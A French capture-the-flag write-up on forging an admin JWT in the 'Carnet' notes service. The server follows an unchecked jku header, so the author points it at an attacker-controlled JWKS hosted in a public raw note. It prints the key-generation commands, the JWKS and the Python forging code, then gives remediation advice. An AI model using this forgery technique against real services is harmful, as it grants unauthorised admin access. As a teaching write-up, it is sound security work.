# Carnet — forger un JWT admin via le jku

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/carnet/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Le JWT de Carnet est signé en RS256 avec un header `jku` qui dit au
> serveur où aller chercher la clé publique. Le serveur ne vérifie pas que cette
> URL est bien la sienne. Je publie mon propre JWKS dans une note publique, je
> forge un token `role: admin` signé avec ma clé privée, je pointe `jku` sur ma
> note, et `/admin` me livre le flag. **Flag :** `NCTF{…}`.

## 1. Reconnaissance

Carnet est un service de notes perso : je crée un compte, je me connecte. Le
cookie `token` contient un JWT. Je le décode :

- **Header** — `alg: RS256`, un `kid`, et surtout un champ **`jku`** pointant sur
  `/.well-known/jwks.json`.
- **Payload** — `sub`, `uid`, `role: "member"`.

`/.well-known/jwks.json` répond bien avec le trousseau de clés publiques au format
JWKS standard.

## 2. La faille

Le `jku` (JWK Set URL) indique au serveur **où** chercher la clé publique pour
vérifier la signature. Si le serveur ne contrôle pas que ce chemin est bien son
point de distribution officiel, je peux l'envoyer lire une clé que je contrôle —
et donc signer mes propres tokens.

Il me faut juste un moyen d'héberger du contenu arbitraire sur le même domaine. Je
le trouve : chaque note a une vue `/notes/<id>/raw` qui renvoie le contenu brut en
`text/plain` dès que la note est publique.

## 3. Exploitation

**a) Je génère ma paire de clés RSA** en local :

```bash
openssl genrsa -out priv.pem 2048
openssl rsa -in priv.pem -pubout -out pub.pem
```

**b) Je crée une note publique** dont le contenu est un JWKS exposant ma clé
publique (mêmes champs que `/.well-known/jwks.json`, avec mon propre `kid`) :

```json
{"keys":[{"kty":"RSA","kid":"pwn","use":"sig","alg":"RS256","n":"<n>","e":"AQAB"}]}
```

**c) Je forge le JWT** signé avec ma clé privée :

```python
import jwt
tok = jwt.encode(
    {"sub": "me", "uid": 1, "role": "admin"},
    open("priv.pem").read(),
    algorithm="RS256",
    headers={"kid": "pwn", "jku": "https://<cible>/notes/<id-de-ma-note>/raw"},
)
```

**d) Je remplace le cookie** `token` par ce JWT et je visite `/admin`.

Le serveur suit le `jku`, lit mon JWKS dans ma note, trouve la clé `pwn`, valide la
signature (c'est bien ma clé), et fait confiance au payload — `role: admin`
compris.

## 4. Flag

`/admin` liste toutes les notes du système, dont une note administrative :

```text
NCTF{…}
```

## 5. Leçons & remédiation

- **Ne jamais faire confiance au `jku` fourni par le client.** Valider l'URL
  contre une allow-list stricte (schéma + host + chemin exacts), ou ne pas
  supporter `jku` du tout et épingler la clé publique côté serveur.
- Un hébergement de contenu arbitraire sur le domaine (ici les notes `raw`)
  transforme n'importe quelle confiance dans une URL same-origin en forge de
  token.
